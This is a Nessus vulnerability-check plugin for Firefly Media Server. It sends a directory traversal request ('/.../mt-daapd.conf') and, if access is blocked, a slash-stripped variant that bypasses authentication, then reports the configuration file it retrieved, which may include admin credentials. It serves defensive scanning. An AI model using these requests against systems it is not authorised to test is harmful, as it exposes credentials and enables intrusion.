#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(29252);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(26770);
  script_xref(name:"OSVDB", value:"51190");
  script_xref(name:"OSVDB", value:"51192");

  script_name(english:"Firefly Media Server Limited Directory Traversal Admin Credential Disclosure");
  script_summary(english:"Tries to read mt-daapd.conf");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a partial directory traversal
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Firefly Media Server, also known as
mt-daapd, a media streaming server. 

The version of Firefly Media Server installed on the remote Windows
host allows an attacker to retrieve arbitrary files, possibly
bypassing authentication, from the parent directory of Firefly's
'admin-root' folder, including the application's configuration file. 

In addition, Firefly Media Server has been reported to be vulnerable
to two denial of service issues. However, Nessus has not checked for
these." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/484763/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );


script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_require_keys("Host/OS");
  script_require_ports("Services/www", 9999);

  exit(0);
}


os = get_kb_item("Host/OS");
if (!os || "Windows" >!< os) exit(0);

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:9999);


# Make sure it looks like Firefly / mt-daapd.
banner = get_http_banner(port:port);
if (
  !banner ||
  ("mt-daapd/" >!< banner && "Firefly Media Server/" >!< banner)
) exit(0);


# Try to exploit the issue to retrieve Firefly's configuration file.
url = "/.../mt-daapd.conf";

r = http_send_recv3(method: "GET", item:url, port:port);
if (isnull(r)) exit(0);
res = strcat(r[0], r[1], '\r\n', r[2]);

# If it's protected, try to bypass authentication.
if ("location: /no_access.html" >< res )
{
  url = url - "/";

  r = http_send_recv3(method: "GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);
}


# There's a problem if we retrieved the file.
if (
  "[general]" >< res &&
  res =~ "web_root *= *"
)
{
  # Ignore the HTTP headers.
  contents = r[2];

  if (url[0] != "/")
  {
    report = string(
      "Nessus was able to bypass authentication and retrieve the contents of\n",
      "Firefly's configuration file, mt-daapd.conf, from the remote host :\n"
    );
  }
  else
  {
    report = string(
      "Here are the contents of Firefly's configuration file, mt-daapd.conf, that\n",
      "Nessus was able to read from the remote host :\n"
    );
  }
  report = string(
    report,
    "\n",
    contents, "\n"
  );
  security_hole(port:port, extra:report);
}
